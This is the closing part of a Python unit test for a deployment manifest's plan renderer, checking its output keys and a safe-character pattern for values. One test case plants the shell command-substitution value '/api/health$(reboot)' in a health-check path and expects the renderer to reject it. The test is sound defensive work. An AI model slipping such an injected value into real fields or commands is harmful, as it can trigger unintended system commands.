        doc0, doc1 = read_json(manifest_of(f["b0"])), read_json(manifest_of(f["b1"]))
        plan = mf.render_plan(doc1)
        self.assertEqual(plan["SERVICES_TO_REBUILD"], "backend")
        self.assertEqual(plan["PREVIOUS_RELEASE_ID"], doc0["release"]["release_id"])
        self.assertEqual(plan["PREVIOUS_TREE"], doc0["release"]["app"]["tree"])
        self.assertEqual(plan["FLAG_EXPECT_PERMISSION_SERVICE_MODE"], "off")
        self.assertEqual(plan["MIGRATIONS_DECLARED"], "0")
        self.assertEqual(plan["LEGACY_EXTRAS"], "NONE")
        self.assertEqual(plan["SERVICE_CONTAINERS"], "backend:begwork-backend,frontend:begwork-frontend")
        self.assertEqual(mf.render_plan(doc0)["LEGACY_EXTRAS"], "nginx.conf=" + LIVE_NGINX_BLOB)
        for key, value in plan.items():
            self.assertRegex(key, r"^[A-Z][A-Z0-9_]*$")
            self.assertRegex(value, r"^[A-Za-z0-9._:/@%+=,-]*$")
        evil = copy.deepcopy(doc1)
        evil["release"]["smoke"]["health_path"] = "/api/health$(reboot)"
        with self.assertRaises(ValueError):
            mf.render_plan(evil)


if __name__ == "__main__":
    unittest.main()
